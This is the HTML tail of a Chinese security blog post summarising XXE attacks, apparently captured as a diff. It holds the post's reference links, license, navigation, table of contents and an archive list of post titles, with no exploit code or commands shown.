+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol>
+<li><a href="http://docs.ioin.in/writeup/mohemiv.com/_all_exploiting_xxe_with_local_dtd_files_/index.html" target="_blank" rel="noopener">http://docs.ioin.in/writeup/mohemiv.com/_all_exploiting_xxe_with_local_dtd_files_/index.html</a></li>
+<li><a href="https://xz.aliyun.com/t/2571" target="_blank" rel="noopener">https://xz.aliyun.com/t/2571</a></li>
+<li><a href="https://articles.zsxq.com/id_85l86vkeu8zf.html" target="_blank" rel="noopener">https://articles.zsxq.com/id_85l86vkeu8zf.html</a></li>
+</ol>
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://blog.sari3l.com">Sariel.D</a>
+            <p>原文链接：<a href="https://blog.sari3l.com/posts/fedef51/">https://blog.sari3l.com/posts/fedef51/</a>
+            <p>发表日期：<a href="https://blog.sari3l.com/posts/fedef51/">December 19th 2018, 6:11:20 pm</a>
+            <p>更新日期：<a href="https://blog.sari3l.com/posts/fedef51/">July 6th 2020, 5:55:57 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/posts/f8004910/" title= "Chrome Extensions —— fir.im Downloader 编写">
+                    <div class="nextTitle">Chrome Extensions —— fir.im Downloader 编写</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/posts/90979812/" title= "Burp Extensions —— RSA Plugin 编写">
+                    <div class="prevTitle">Burp Extensions —— RSA Plugin 编写</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- gitalk评论 -->
+
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:master@mail.sari3l.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="https://github.com/sari3l" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://www.instagram.com/x3rias" class="iconfont-archer instagram" target="_blank" title=instagram></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-简介"><span class="toc-number">1.</span> <span class="toc-text">0x01 简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#i-XML"><span class="toc-number">1.1.</span> <span class="toc-text">i. XML</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ii-DTD"><span class="toc-number">1.2.</span> <span class="toc-text">ii. DTD</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iii-ENTITY"><span class="toc-number">1.3.</span> <span class="toc-text">iii. ENTITY</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#声明"><span class="toc-number">1.3.1.</span> <span class="toc-text">声明</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#URL-支持的协议"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">URL 支持的协议</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#引用"><span class="toc-number">1.3.2.</span> <span class="toc-text">引用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#注意事项"><span class="toc-number">1.3.3.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iv-可能造成的危害"><span class="toc-number">1.4.</span> <span class="toc-text">iv. 可能造成的危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#v-Libxml-与-PHP"><span class="toc-number">1.5.</span> <span class="toc-text">v. Libxml 与 PHP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-OOB-XXE"><span class="toc-number">2.</span> <span class="toc-text">0x02 OOB XXE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Error-XXE"><span class="toc-number">3.</span> <span class="toc-text">0x03 Error XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#i-Local-DTD"><span class="toc-number">3.1.</span> <span class="toc-text">i. Local DTD</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#本地-DTD-文件"><span class="toc-number">3.1.1.</span> <span class="toc-text">本地 DTD 文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ii-Without-Local-DTD"><span class="toc-number">3.2.</span> <span class="toc-text">ii. Without Local DTD</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考资料"><span class="toc-number">4.</span> <span class="toc-text">参考资料</span></a></li></ol> -->
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-简介"><span class="toc-text">0x01 简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#i-XML"><span class="toc-text">i. XML</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ii-DTD"><span class="toc-text">ii. DTD</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iii-ENTITY"><span class="toc-text">iii. ENTITY</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#声明"><span class="toc-text">声明</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#URL-支持的协议"><span class="toc-text">URL 支持的协议</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#引用"><span class="toc-text">引用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#注意事项"><span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iv-可能造成的危害"><span class="toc-text">iv. 可能造成的危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#v-Libxml-与-PHP"><span class="toc-text">v. Libxml 与 PHP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-OOB-XXE"><span class="toc-text">0x02 OOB XXE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Error-XXE"><span class="toc-text">0x03 Error XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#i-Local-DTD"><span class="toc-text">i. Local DTD</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#本地-DTD-文件"><span class="toc-text">本地 DTD 文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ii-Without-Local-DTD"><span class="toc-text">ii. Without Local DTD</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考资料"><span class="toc-text">参考资料</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 74
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/15</span><a class="archive-post-title" href= "/posts/9a92d107/" >🔐</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/15</span><a class="archive-post-title" href= "/posts/fd03bf87/" >🔐</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/12</span><a class="archive-post-title" href= "/posts/df08045a/" >🔐</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/26</span><a class="archive-post-title" href= "/posts/787c7e6c/" >🔐</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/23</span><a class="archive-post-title" href= "/posts/55ea3bd4/" >Shiro-055 分析&回显</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/18</span><a class="archive-post-title" href= "/posts/6712089c/" >深信服 EDR RCE 简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/04</span><a class="archive-post-title" href= "/posts/c5e878c3/" >CobaltStrike Argue 原理 - 翻译文</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/02</span><a class="archive-post-title" href= "/posts/afd91327/" >Github Page 加速</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/31</span><a class="archive-post-title" href= "/posts/76ce816c/" >CobaltStrike 破解步骤</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/13</span><a class="archive-post-title" href= "/posts/b7ea5c49/" >一道题回顾智能合约 Coverage</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/06</span><a class="archive-post-title" href= "/posts/58a67794/" >F5 BIG-IP RCE简单分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/17</span><a class="archive-post-title" href= "/posts/608d18f0/" >用友NC反序列化 简单分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/14</span><a class="archive-post-title" href= "/posts/d4fb29f2/" >Pwnable.kr 之 Toddler's Bottle</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/01</span><a class="archive-post-title" href= "/posts/ecb4dfa2/" >Weblogic T3 协议学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/20</span><a class="archive-post-title" href= "/posts/e32c5d3e/" >CVE-2020-2551 简单分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/12</span><a class="archive-post-title" href= "/posts/fa80d225/" >CVE-2020-2555 简单分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/02</span><a class="archive-post-title" href= "/posts/91ba290f/" >Java 反弹 Shell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/26</span><a class="archive-post-title" href= "/posts/56fcf5d8/" >Thinkphp 5.0.x 反序列化简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/22</span><a class="archive-post-title" href= "/posts/7d9ef63e/" >CVE-2020-1938（Ghost Cat）简单分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/17</span><a class="archive-post-title" href= "/posts/2cc5b12d/" >JDBC Deserialization</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/16</span><a class="archive-post-title" href= "/posts/f0f80c65/" >Abusing MySQL clients RCE</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/posts/f33694e6/" >2020 All is New</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/25</span><a class="archive-post-title" href= "/posts/418c3786/" >对 Cookie 的一点学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/18</span><a class="archive-post-title" href= "/posts/1e8439b5/" >HTTP Smuggling Attack 随笔</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/10</span><a class="archive-post-title" href= "/posts/b61194b/" >ThinkPHP 6.0.x 反序列化简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/07</span><a class="archive-post-title" href= "/posts/4457d4a3/" >ThinkPHP 5.1.x 反序列化简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/31</span><a class="archive-post-title" href= "/posts/a3557ae1/" >记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/12</span><a class="archive-post-title" href= "/posts/9622f295/" >Mysql 注入基础小结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/03</span><a class="archive-post-title" href= "/posts/a62f29f1/" >XSS with ServiceWorkers</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/23</span><a class="archive-post-title" href= "/posts/66ad34dc/" >CSP 小结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/07</span><a class="archive-post-title" href= "/posts/13977d3a/" >SVG with HTML Parsing</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href= "/posts/76496c2b/" >Fastjson 新反序列化漏洞解析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/16</span><a class="archive-post-title" href= "/posts/85fdfb64/" >SSRF 小结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/13</span><a class="archive-post-title" href= "/posts/d8415c32/" >Discuz! ML 3.x 命令执行简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/10</span><a class="archive-post-title" href= "/posts/fb0090e/" >Redis Rce 简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/02</span><a class="archive-post-title" href= "/posts/8dea0d95/" >Sqlmap --os-shell 原理简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/15</span><a class="archive-post-title" href= "/posts/6fee1744/" >Active Directory Recon 初步学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/21</span><a class="archive-post-title" href= "/posts/caf0d20c/" >RCTF 2019 WEB writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/09</span><a class="archive-post-title" href= "/posts/73ecd8cc/" >Jenkins CVE-2018-1000861 学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/07</span><a class="archive-post-title" href= "/posts/65a5a87a/" >*CTF 2019 homebrewEvtLoop</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/27</span><a class="archive-post-title" href= "/posts/243b6098/" >Web(CTF)中的密码学 (一)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/19</span><a class="archive-post-title" href= "/posts/7a31e713/" >Abusing MySQL Clients 学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/12</span><a class="archive-post-title" href= "/posts/8e809579/" >DDCTF 2019 部分 writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/30</span><a class="archive-post-title" href= "/posts/6fdffa73/" >0CTF/TCTF 2019 WEB writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/18</span><a class="archive-post-title" href= "/posts/1b4ade61/" >JSONP Content-Type 简单Fuzz</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/posts/469de5e6/" >JNDI/LADP 学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/07</span><a class="archive-post-title" href= "/posts/284d4995/" >Fastjson 反序列化漏洞研究</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/06</span><a class="archive-post-title" href= "/posts/fdaf04b/" >SMTP 25 端口测试记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/06</span><a class="archive-post-title" href= "/posts/9b1f3ba/" >pyppeteer 学习记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/31</span><a class="archive-post-title" href= "/posts/4ffb62e5/" >Python 多线程、多进程、协程(未完结)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/29</span><a class="archive-post-title" href= "/posts/83241730/" >Frida —— WeChat(二) 🧧</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/25</span><a class="archive-post-title" href= "/posts/b11f7440/" >动态调试 with smali</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/24</span><a class="archive-post-title" href= "/posts/76594cbe/" >Nexus 解决显示 “无法访问互联网”</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/19</span><a class="archive-post-title" href= "/posts/5da99ec5/" >Frida —— WeChat(一) 🎲</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/16</span><a class="archive-post-title" href= "/posts/d55cdeb2/" >Frida —— 初体验</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/posts/446263e2/" >关系爬虫 —— Weibo</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/posts/27a5d990/" >2019 All For One</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/30</span><a class="archive-post-title" href= "/posts/9dafb9a3/" >OpenCV 初接触</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/24</span><a class="archive-post-title" href= "/posts/2fefc8f7/" >验证码破解系列 —— 数美</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/21</span><a class="archive-post-title" href= "/posts/f8004910/" >Chrome Extensions —— fir.im Downloader 编写</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/19</span><a class="archive-post-title" href= "/posts/fedef51/" >XXE 小结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/14</span><a class="archive-post-title" href= "/posts/90979812/" >Burp Extensions —— RSA Plugin 编写</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/01</span><a class="archive-post-title" href= "/posts/81dfbfaf/" >CODE BREAKING</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/23</span><a class="archive-post-title" href= "/posts/4a17b156/" >Hello World</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/08</span><a class="archive-post-title" href= "/posts/970fcb23/" >OGNL Payload</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/06</span><a class="archive-post-title" href= "/posts/d34dbe44/" >s2-016 漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href= "/posts/626780ce/" >s2-032 漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/31</span><a class="archive-post-title" href= "/posts/617314e9/" >s2-033 & s2-037 漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span><a class="archive-post-title" href= "/posts/9cab2514/" >s2-045 漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/17</span><a class="archive-post-title" href= "/posts/e0ca00cf/" >s2-046 漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/16</span><a class="archive-post-title" href= "/posts/2b51554f/" >s2-048 漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/11</span><a class="archive-post-title" href= "/posts/2b51554f/" >s2-048 漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/09</span><a class="archive-post-title" href= "/posts/dd92b54a/" >s2-053 漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/08</span><a class="archive-post-title" href= "/posts/c43e3a51/" >s2-057 漏洞分析</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="writeup"><span class="iconfont-archer">&#xe606;</span>writeup</span>
+    
+        <span class="sidebar-tag-name" data-tags="随笔"><span class="iconfont-archer">&#xe606;</span>随笔</span>
+    
+        <span class="sidebar-tag-name" data-tags="Mysql"><span class="iconfont-archer">&#xe606;</span>Mysql</span>
+    
+        <span class="sidebar-tag-name" data-tags="内网"><span class="iconfont-archer">&#xe606;</span>内网</span>
+    
+        <span class="sidebar-tag-name" data-tags="RedTeam"><span class="iconfont-archer">&#xe606;</span>RedTeam</span>
+    
+        <span class="sidebar-tag-name" data-tags="Burp suite"><span class="iconfont-archer">&#xe606;</span>Burp suite</span>
+    
+        <span class="sidebar-tag-name" data-tags="coding"><span class="iconfont-archer">&#xe606;</span>coding</span>
+    
+        <span class="sidebar-tag-name" data-tags="extension"><span class="iconfont-archer">&#xe606;</span>extension</span>
+    
+        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
+    
